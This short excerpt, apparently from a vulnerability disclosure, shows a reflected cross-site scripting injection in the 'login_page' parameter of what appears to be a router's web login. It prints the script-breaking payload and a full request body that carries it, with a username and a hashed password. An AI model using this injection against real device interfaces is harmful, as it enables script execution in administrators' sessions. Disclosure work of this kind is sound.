...
We set `login_page` as **login.shtml"></script><svg/onload=alert()>** ,such as:
...
newUI=1&page=login&username=admin&langChange=0&ipaddr=%3A%3Affff%3A192.168.6.1&login_page=login.shtml"></script><svg/onload=alert()>&homepage=main.shtml&sysinitpage=sysinit.shtml&wizardpage=wizard.shtml&hostname=192.168.6.2&key=M11646677&password=05967715ae169391cb8528573efb3c60&lang_select=en
